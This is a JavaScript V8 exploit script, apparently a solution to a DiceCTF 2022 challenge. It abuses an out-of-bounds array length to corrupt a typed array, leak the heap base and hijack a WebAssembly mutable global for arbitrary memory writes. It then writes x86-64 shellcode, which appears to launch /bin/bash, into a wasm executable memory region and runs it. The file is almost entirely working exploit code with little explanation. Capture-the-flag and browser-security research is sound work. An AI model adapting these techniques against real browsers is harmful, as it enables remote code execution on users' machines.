// https://github.com/Kyle-Kyle/blog/blob/master/writeups/dice22_memory_hole
var buf = new ArrayBuffer(8);
var uIntArray = new Uint32Array(buf);
var floatArray = new Float64Array(buf);

function ftoi(doubleNum)
{
    floatArray[0] = doubleNum;
    intNum = BigInt(uIntArray[0]) + (BigInt(uIntArray[1]) << 32n);
    return intNum
}

function itof(intNum)
{
    uIntArray[0] = Number(intNum & 0xffffffffn);
    uIntArray[1] = Number(intNum >> 32n);
    return floatArray[0];
}

function main()
{
    console.log("v8 exploit for DiceCTF 22");
    var arrayOfDoubles = [1.1, 1.2, 1.3];
    var arrayOfUint = new Uint32Array(10);
    arrayOfDoubles.setLength(0x100);
    //%DebugPrint(arrayOfDoubles);
    console.log("----------------------------");
    console.log(arrayOfDoubles[0x19] + " to Integer = " + ftoi(arrayOfDoubles[0x19]).toString(16));
    // Going oob and make base_pointer and external_pointer both nulls
    // To start writing from heap js base.
    // We can not use the backing store from ArrayBuffer.
    arrayOfDoubles[0x18] = 0;
    arrayOfDoubles[0x19] = 0;

    //%DebugPrint(arrayOfUint);
    var length = arrayOfDoubles[0x17];
    length = ftoi(length)
    length = length | 0xffffffff00000000n;
    arrayOfDoubles[0x17] = itof(length);
    console.log("Word after length is ", length.toString(16));
    // %DebugPrint(arrayOfUint);
    // Because pointer are compressed I need to leak the upper 32 bits.
    // Or the js base
    var js_base = BigInt(arrayOfUint[7]) << 32n | BigInt(arrayOfUint[6]) - 0x4000n;
    console.log("Js base @ 0x" + js_base.toString(16));
    // allocate the writer webassembly
    var global = new WebAssembly.Global({value:'i64', mutable:true}, 0n);
    var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 3, 96, 0, 1, 126, 96, 0, 0, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 4, 3, 0, 1, 2, 7, 37, 3, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99, 71, 108, 111, 98, 97, 108, 0, 1, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 2, 10, 23, 3, 4, 0, 35, 0, 11, 9, 0, 35, 0, 66, 1, 124, 36, 0, 11, 6, 0, 32, 0, 36, 0, 11]);
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod, {js: {global}});
    //%DebugPrint(wasm_instance);

    console.log(arrayOfUint[5].toString(16));
    
    var wasm_code2 = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasm_mod2 = new WebAssembly.Module(wasm_code2);
    var wasm_instance2 = new WebAssembly.Instance(wasm_mod2);
    var f = wasm_instance2.exports.main;
    console.log("---------------------------------------target--------------------------------------");
    //%DebugPrint(wasm_instance2);

    var i = 0x81c0000/4;
    flag1 = true
    flag2 = true
    while(flag1 || flag2)
    {
        if (arrayOfUint[i] == 0x082075e1 && arrayOfUint[i + 1] == 0x08002249 && arrayOfUint[i + 6] == 0)
        {
            console.log("Found it at ", i);
            wasm_arbwr = i;
            flag1 = false;
        }
        else if (arrayOfUint[i] == 0x082075e1 && arrayOfUint[i + 1] == 0x08002249 && arrayOfUint[i + 6] != 0)
        {
            wasmrwx = i
            flag2 = false;
        }
        i++;
    }
    
    rwx_region = BigInt(arrayOfUint[wasmrwx + 0x18]) | (BigInt(arrayOfUint[wasmrwx + 0x19]) << 32n)
    console.log("rwx region @ ", rwx_region.toString(16));
    console.log("imported_mutable_globals is at offset ", wasm_arbwr);
    var imported_mutable_global_index = wasm_arbwr + 0x14;
    var Uintelements = js_base;

    arrayOfUint[imported_mutable_global_index] = Number(Uintelements & 0xffffffffn);
    arrayOfUint[imported_mutable_global_index+1] = Number(Uintelements >> 32n);

    function write4bytes(where, val)
    {
        arrayOfUint[0] = Number(where & 0xffffffffn);
        arrayOfUint[1] = Number(where >> 32n);
        //%DebugPrint(wasm_instance);
        wasm_instance.exports.setGlobal(BigInt(val));
    }
    var shellcode = [0xb848686a, 0x6e69622f, 0x7361622f, 0xe7894850, 0xb848686a, 0x6e69622f, 0x7361622f, 0x56f63150, 0x485e086a, 0x4856e601, 0xd231e689, 0xf583b6a, 0x90909005];
    //shellcode = [217973098, 1723353124, 778527084, 1349810292, 837257544, 1794519506, 84891650, 33667649, 2168520961, 16974322, 1593928193, 57332273, 1479043678, 1295];
    j = 0;
    while(j < shellcode.length)
    {
        write4bytes(rwx_region+BigInt(j)*4n, shellcode[j]);
        j++;
    }
    //%DebugPrint(wasm_instance);
    f();
}

main()